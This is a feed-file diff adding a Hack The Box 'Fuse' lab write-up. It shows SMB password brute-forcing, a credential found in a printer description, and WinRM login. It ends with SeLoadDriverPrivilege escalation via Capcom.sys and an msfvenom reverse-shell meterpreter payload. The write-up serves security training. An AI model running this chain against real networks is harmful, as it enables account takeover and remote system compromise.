+    
+  </entry>
+  
+  <entry>
+    <title>HTB Fuse Writeup</title>
+    <link href="https://ik0nw.github.io/2020/06/15/HTB-Fuse/"/>
+    <id>https://ik0nw.github.io/2020/06/15/HTB-Fuse/</id>
+    <published>2020-06-15T00:00:00.000Z</published>
+    <updated>2020-11-07T07:54:21.015Z</updated>
+    
+    <content type="html"><![CDATA[<p><img src="/images/HTB-Fuse-Medium/image-20200907105043113.png" alt="image-20200907105043113"></p><h2 id="Author-Ikonw"><a href="#Author-Ikonw" class="headerlink" title="Author Ikonw"></a>Author Ikonw</h2><h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Nmap 7.80 scan initiated Wed Sep  2 03:57:19 2020 as: nmap -Pn -sCV -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49666,49667,49675,49676,49680,49698 -oN nmap/Full_10.10.10.193.nmap 10.10.10.193</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.193</span><br><span class="line">Host is up (0.0079s latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE SERVICE      VERSION</span><br><span class="line">53/tcp    open  domain?</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   DNSVersionBindReqTCP: </span><br><span class="line">|     version</span><br><span class="line">|_    <span class="built_in">bind</span></span><br><span class="line">80/tcp    open  http         Microsoft IIS httpd 10.0</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">|_http-title: Site doesn<span class="string">&#x27;t have a title (text/html).</span></span><br><span class="line"><span class="string">88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2020-09-02 08:10:26Z)</span></span><br><span class="line"><span class="string">135/tcp   open  msrpc        Microsoft Windows RPC</span></span><br><span class="line"><span class="string">139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn</span></span><br><span class="line"><span class="string">389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: fabricorp.local, Site: Default-First-Site-Name)</span></span><br><span class="line"><span class="string">445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: FABRICORP)</span></span><br><span class="line"><span class="string">464/tcp   open  kpasswd5?</span></span><br><span class="line"><span class="string">593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0</span></span><br><span class="line"><span class="string">636/tcp   open  tcpwrapped</span></span><br><span class="line"><span class="string">3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: fabricorp.local, Site: Default-First-Site-Name)</span></span><br><span class="line"><span class="string">3269/tcp  open  tcpwrapped</span></span><br><span class="line"><span class="string">5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span></span><br><span class="line"><span class="string">|_http-server-header: Microsoft-HTTPAPI/2.0</span></span><br><span class="line"><span class="string">|_http-title: Not Found</span></span><br><span class="line"><span class="string">9389/tcp  open  mc-nmf       .NET Message Framing</span></span><br><span class="line"><span class="string">49666/tcp open  msrpc        Microsoft Windows RPC</span></span><br><span class="line"><span class="string">49667/tcp open  msrpc        Microsoft Windows RPC</span></span><br><span class="line"><span class="string">49675/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0</span></span><br><span class="line"><span class="string">49676/tcp open  msrpc        Microsoft Windows RPC</span></span><br><span class="line"><span class="string">49680/tcp open  msrpc        Microsoft Windows RPC</span></span><br><span class="line"><span class="string">49698/tcp open  msrpc        Microsoft Windows RPC</span></span><br><span class="line"><span class="string">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span></span><br><span class="line"><span class="string">SF-Port53-TCP:V=7.80%I=7%D=9/2%Time=5F4F506B%P=x86_64-pc-linux-gnu%r(DNSVe</span></span><br><span class="line"><span class="string">SF:rsionBindReqTCP,20,&quot;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\x</span></span><br><span class="line"><span class="string">SF:04bind\0\0\x10\0\x03&quot;);</span></span><br><span class="line"><span class="string">Service Info: Host: FUSE; OS: Windows; CPE: cpe:/o:microsoft:windows</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Host script results:</span></span><br><span class="line"><span class="string">|_clock-skew: mean: 2h33m00s, deviation: 4h02m32s, median: 12m58s</span></span><br><span class="line"><span class="string">| smb-os-discovery: </span></span><br><span class="line"><span class="string">|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)</span></span><br><span class="line"><span class="string">|   Computer name: Fuse</span></span><br><span class="line"><span class="string">|   NetBIOS computer name: FUSE\x00</span></span><br><span class="line"><span class="string">|   Domain name: fabricorp.local</span></span><br><span class="line"><span class="string">|   Forest name: fabricorp.local</span></span><br><span class="line"><span class="string">|   FQDN: Fuse.fabricorp.local</span></span><br><span class="line"><span class="string">|_  System time: 2020-09-02T01:12:45-07:00</span></span><br><span class="line"><span class="string">| smb-security-mode: </span></span><br><span class="line"><span class="string">|   account_used: guest</span></span><br><span class="line"><span class="string">|   authentication_level: user</span></span><br><span class="line"><span class="string">|   challenge_response: supported</span></span><br><span class="line"><span class="string">|_  message_signing: required</span></span><br><span class="line"><span class="string">| smb2-security-mode: </span></span><br><span class="line"><span class="string">|   2.02: </span></span><br><span class="line"><span class="string">|_    Message signing enabled and required</span></span><br><span class="line"><span class="string">| smb2-time: </span></span><br><span class="line"><span class="string">|   date: 2020-09-02T08:12:42</span></span><br><span class="line"><span class="string">|_  start_date: 2020-09-02T08:04:25</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span></span><br><span class="line"><span class="string"># Nmap done at Wed Sep  2 04:01:52 2020 -- 1 IP address (1 host up) scanned in 273.40 seconds</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><p>We get the FQDN from the smb-os-discovery script</p><p>add it to the <strong>&#x2F;etc&#x2F;hosts</strong></p><p>I like to enumerate smb ports first</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─<span class="comment"># enum4linux Fuse.fabricorp.local</span></span><br><span class="line">Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Mon Sep  7 11:02:19 2020</span><br></pre></td></tr></table></figure><p>However it didnt give me any critical information, anonymous login didnt get me anything too</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─<span class="comment"># smbclient -L 10.10.10.193                                                       </span></span><br><span class="line">Enter WORKGROUP\root<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">Anonymous login successful</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Sharename       Type      Comment</span></span><br><span class="line"><span class="string">        ---------       ----      -------</span></span><br><span class="line"><span class="string">SMB1 disabled -- no workgroup available</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><p>Start investigate the web, it’s a papercut CMS if im not wrong. </p><p>Found some user in each print logs</p><p><img src="/images/HTB-Fuse-Medium/image-20200907111546993.png" alt="image-20200907111546993"></p><p>We collect all the user</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pmerton</span><br><span class="line">tlavel</span><br><span class="line">sthompson</span><br><span class="line">bhult</span><br><span class="line">administrator</span><br></pre></td></tr></table></figure><p>According to previous box such as <strong>sauna</strong>.</p><p>The entry point most likely is to collect user and password from the web server and brute force on smb ports.</p><p>Therefore we use <strong>cewl</strong> to make a collection of password dictionary.</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cewl -w wordlist http://fuse.fabricorp.local/papercut/logs/html/index.htm -m3 --with-numbers</span><br></pre></td></tr></table></figure><p>Launch msfconsole use the <strong>smb_login</strong> module to bruteforce </p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf5 auxiliary(scanner/smb/smb_login) &gt; <span class="built_in">set</span> USER_FILE user</span><br><span class="line">USER_FILE =&gt; user</span><br><span class="line">msf5 auxiliary(scanner/smb/smb_login) &gt; <span class="built_in">set</span> PASS_FILE wordlist</span><br><span class="line">PASS_FILE =&gt; wordlist</span><br><span class="line">msf5 auxiliary(scanner/smb/smb_login) &gt; <span class="built_in">set</span> rhosts 10.10.10.193</span><br><span class="line">rhosts =&gt; 10.10.10.193</span><br><span class="line">msf5 auxiliary(scanner/smb/smb_login) &gt; <span class="built_in">set</span> smbdomain fabricorp.local</span><br><span class="line">smbdomain =&gt; fabricorp.local</span><br><span class="line">msf5 auxiliary(scanner/smb/smb_login) &gt; run</span><br></pre></td></tr></table></figure><p>successfully got 2 creds</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[+] 10.10.10.193:445      - 10.10.10.193:445 - Success: <span class="string">&#x27;fabricorp.local\tlavel:Fabricorp01&#x27;</span></span><br><span class="line">[+] 10.10.10.193:445      - 10.10.10.193:445 - Success: <span class="string">&#x27;fabricorp.local\bhult:Fabricorp01&#x27;</span></span><br></pre></td></tr></table></figure><p>Trying login to smb server, but was prompt with error which I never meet. Both account have the same problem</p><figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[~/Desktop/hackthebox/Windows/fuse]</span><br><span class="line">└─<span class="meta"># smbclient -L 10.10.10.193 -U tlavel           </span></span><br><span class="line">Enter WORKGROUP\tlavel<span class="number">&#x27;</span>s password: </span><br><span class="line">session setup failed: NT_STATUS_PASSWORD_MUST_CHANGE</span><br><span class="line">                                                                                                                   </span><br><span class="line">┌──(root💀kali)-[~/Desktop/hackthebox/Windows/fuse]</span><br><span class="line">└─<span class="meta"># smbclient -L 10.10.10.193 -U bhult                                                                         </span></span><br><span class="line">Enter WORKGROUP\bhult<span class="number">&#x27;</span>s password: </span><br><span class="line">session setup failed: NT_STATUS_PASSWORD_MUST_CHANGE</span><br></pre></td></tr></table></figure><p>After some google,find out I can use smbpasswd to change the password</p><p><img src="/images/HTB-Fuse-Medium/image-20200907113508780.png" alt="image-20200907113508780"></p><p>There seems some password policy, so I change the password to <strong>Fabricop011</strong> for both accout</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[~/Desktop/hackthebox/Windows/fuse]</span><br><span class="line">└─<span class="comment"># smbpasswd -r 10.10.10.193 -U tlavel                                                                        </span></span><br><span class="line">Old SMB password:</span><br><span class="line">New SMB password:</span><br><span class="line">Retype new SMB password:</span><br><span class="line">Password changed <span class="keyword">for</span> user tlavel on 10.10.10.193.</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>After some enumeration on <strong>rpcclient</strong> and password <strong>$fab@s3Rv1ce$1</strong></p><p>found some username </p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rpcclient $&gt; enumdomusers</span><br><span class="line">user:[Administrator] rid:[0x1f4]</span><br><span class="line">user:[Guest] rid:[0x1f5]</span><br><span class="line">user:[krbtgt] rid:[0x1f6]</span><br><span class="line">user:[DefaultAccount] rid:[0x1f7]</span><br><span class="line">user:[svc-print] rid:[0x450]</span><br><span class="line">user:[bnielson] rid:[0x451]</span><br><span class="line">user:[sthompson] rid:[0x641]</span><br><span class="line">user:[tlavel] rid:[0x642]</span><br><span class="line">user:[pmerton] rid:[0x643]</span><br><span class="line">user:[svc-scan] rid:[0x645]</span><br><span class="line">user:[bhult] rid:[0x1bbd]</span><br><span class="line">user:[dandrews] rid:[0x1bbe]</span><br><span class="line">user:[mberbatov] rid:[0x1db1]</span><br><span class="line">user:[astein] rid:[0x1db2]</span><br><span class="line">user:[dmuir] rid:[0x1db3]</span><br></pre></td></tr></table></figure><p>and one password</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rpcclient $&gt; enumprinters</span><br><span class="line">        flags:[0x800000]</span><br><span class="line">        name:[\\10.10.10.193\HP-MFT01]</span><br><span class="line">        description:[\\10.10.10.193\HP-MFT01,HP Universal Printing PCL 6,Central (Near IT, scan2docs password: <span class="variable">$fab</span>@s3Rv1ce<span class="variable">$1</span>)]</span><br><span class="line">        comment:[]</span><br></pre></td></tr></table></figure><p>and we try to login to windows using this credentials.</p><p>Went back to to msfconsole, we lanuch <strong>win_rm</strong> module to brute force the username against the password</p><p>and we got the creds <strong>svc-print:$fab@s3Rv1ce$1</strong></p><p>use <strong>evil-winrm</strong> to login</p><figure class="highlight moonscript"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[/opt/evil-winrm]</span><br><span class="line">└─# ./evil-winrm.rb -i <span class="number">10.10</span><span class="number">.10</span><span class="number">.193</span> -u svc-<span class="built_in">print</span> -p \$fab@s3Rv1ce\$<span class="number">1</span>                                           <span class="number">1</span> ⨯</span><br><span class="line"></span><br><span class="line">Evil-WinRM shell v2<span class="number">.3</span></span><br><span class="line"></span><br><span class="line"><span class="name">Info</span>: Establishing connection to remote endpoint</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS <span class="name">C</span>:\Users\svc-print\Documents&gt; dir</span><br><span class="line">*Evil-WinRM* PS <span class="name">C</span>:\Users\svc-print\Documents&gt; cd ..</span><br><span class="line">*Evil-WinRM* PS <span class="name">C</span>:\Users\svc-<span class="built_in">print</span>&gt; dir</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="name">Directory</span>: <span class="name">C</span>:\Users\svc-<span class="built_in">print</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line"><span class="comment">----                -------------         ------ ----</span></span><br><span class="line">d-r<span class="comment">---         6/1/2020   1:45 AM                Desktop</span></span><br><span class="line">d-r<span class="comment">---        5/31/2020   5:20 PM                Documents</span></span><br><span class="line">d-r<span class="comment">---        7/16/2016   6:18 AM                Downloads</span></span><br><span class="line">d-r<span class="comment">---        7/16/2016   6:18 AM                Favorites</span></span><br><span class="line">d-r<span class="comment">---        7/16/2016   6:18 AM                Links</span></span><br><span class="line">d-r<span class="comment">---        7/16/2016   6:18 AM                Music</span></span><br><span class="line">d-r<span class="comment">---        7/16/2016   6:18 AM                Pictures</span></span><br><span class="line">d<span class="comment">-----        7/16/2016   6:18 AM                Saved Games</span></span><br><span class="line">d-r<span class="comment">---        7/16/2016   6:18 AM                Videos</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS <span class="name">C</span>:\Users\svc-<span class="built_in">print</span>&gt; cd Desktop</span><br><span class="line">*Evil-WinRM* PS <span class="name">C</span>:\Users\svc-print\Desktop&gt; dir</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="name">Directory</span>: <span class="name">C</span>:\Users\svc-print\Desktop</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line"><span class="comment">----                -------------         ------ ----</span></span><br><span class="line">-ar<span class="comment">---         9/7/2020  12:35 AM             34 user.txt</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Root"><a href="#Root" class="headerlink" title="Root"></a>Root</h2><p>After getting root, check user’s privilege </p><figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">PRIVILEGES INFORMATION</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">Privilege Name                Description                    State</span><br><span class="line"><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span> <span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span> <span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span></span><br><span class="line">SeMachineAccountPrivilege     Add workstations to domain     Enabled</span><br><span class="line">SeLoadDriverPrivilege         Load and unload device drivers Enabled</span><br><span class="line">SeShutdownPrivilege           Shut down the system           Enabled</span><br><span class="line">SeChangeNotifyPrivilege       Bypass traverse checking       Enabled</span><br><span class="line">SeIncreaseWorkingSetPrivilege Increase a process working set Enabled</span><br></pre></td></tr></table></figure><p><strong>seLoadDrivePrivilege</strong> is enabled</p><p><a href="https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/">Abusing SeLoadDriverPrivilege for privilege escalation</a></p><p>This site is a good reference for SeLoadDriverPrivilege escalation</p><p><a href="https://github.com/umiterkol/EoPLoadDriver_Release/releases">EopLoaddriver</a></p><p><a href="https://github.com/FuzzySecurity/Capcom-Rootkit/raw/master/Driver/Capcom.sys">Capcom.sys</a></p><p><a href="https://github.com/tandasat/ExploitCapcom">ExploitCapcom</a></p><p>open up the ExploitCapcom.cpp file, modify the Launch shell function. Change the commandLine[] targeted to a meterpreter.exe and compile it.</p><p><img src="/images/HTB-Fuse-Medium/image-20200907191952261.png" alt="image-20200907191952261"></p><p>Next we have to generate a meterpreter.exe</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.10.10 lport=1234 -f exe &gt; meterpreter.exe</span><br></pre></td></tr></table></figure><p>Create a folder called <strong>temp</strong> in C:\</p><p>and upload all the 4 files to the target server.</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\temp&gt; .\EOPLOADDRIVER.exe System\CurrentControlSet\MyService C:\temp\capcom.sys</span><br><span class="line">[+] Enabling SeLoadDriverPrivilege</span><br><span class="line">[+] SeLoadDriverPrivilege Enabled</span><br><span class="line">[+] Loading Driver: \Registry\User\S-1-5-21-2633719317-1471316042-3957863514-1104\System\CurrentControlSet\MyService</span><br><span class="line">NTSTATUS: c000010e, WinError: 0</span><br><span class="line">*Evil-WinRM* PS C:\temp&gt; .\ExploitCapcom.exe</span><br><span class="line">[*] Capcom.sys exploit</span><br><span class="line">[*] Capcom.sys handle was obtained as 0000000000000080</span><br><span class="line">[*] Shellcode was placed at 000002841CC20008</span><br><span class="line">[+] Shellcode was executed</span><br><span class="line">[+] Token stealing was successful</span><br><span class="line">[+] The SYSTEM shell was launched</span><br><span class="line">[*] Press any key to <span class="built_in">exit</span> this program</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>And we got the meterpreter session on our multi handler</p><br/><br/><br/><p><img src="/images/root.gif" alt="root"></p>]]></content>
+    
+    
+    <summary type="html">Hackthebox Fuse machine writeup</summary>
+    
+    
+    
+    <category term="hackthebox" scheme="https://ik0nw.github.io/categories/hackthebox/"/>
+    
+    
+    <category term="hackthebox" scheme="https://ik0nw.github.io/tags/hackthebox/"/>
+    
+    <category term="medium" scheme="https://ik0nw.github.io/tags/medium/"/>
     
   </entry>
   
